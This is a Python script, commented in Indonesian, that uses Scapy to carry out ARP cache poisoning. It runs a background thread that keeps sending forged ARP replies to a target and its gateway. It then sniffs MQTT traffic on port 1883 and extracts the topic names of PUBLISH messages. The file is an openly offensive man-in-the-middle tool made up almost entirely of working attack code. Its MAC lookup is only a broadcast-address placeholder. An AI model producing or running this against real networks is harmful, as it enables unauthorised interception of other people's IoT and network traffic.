# mqtt_sniffer_arp.py
from scapy.all import ARP, send, sniff, TCP, Raw
import threading
import time

def get_mac(ip):
    # Dummy resolver, sebaiknya diganti dengan ARP request dinamis jika diperlukan
    return "ff:ff:ff:ff:ff:ff"  # fallback jika tidak tahu MAC

def arp_spoof(target_ip, gateway_ip, iface):
    target = ARP(pdst=target_ip, hwdst=get_mac(target_ip), psrc=gateway_ip)
    gateway = ARP(pdst=gateway_ip, hwdst=get_mac(gateway_ip), psrc=target_ip)

    def spoof():
        while True:
            send(target, verbose=0, iface=iface)
            send(gateway, verbose=0, iface=iface)
            time.sleep(2)

    thread = threading.Thread(target=spoof, daemon=True)
    thread.start()
    return thread

def sniff_mqtt_passive(broker_ip, iface="wlan0", duration=30):
    topics = set()

    def mqtt_sniffer(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if payload[0] >> 4 == 3:  # MQTT PUBLISH
                try:
                    topic_len = int.from_bytes(payload[2:4], 'big')
                    topic = payload[4:4+topic_len].decode()
                    print(f"[SNIFF] Topic: {topic}")
                    topics.add(topic)
                except:
                    pass

    print(f"[INFO] Sniffing MQTT topics on {iface} (target broker: {broker_ip})...")
    try:
        sniff(filter=f"tcp port 1883 and host {broker_ip}", iface=iface, prn=mqtt_sniffer, timeout=duration, store=0)
    except Exception as e:
        print(f"[ERROR] Sniffing failed: {e}")

    return topics
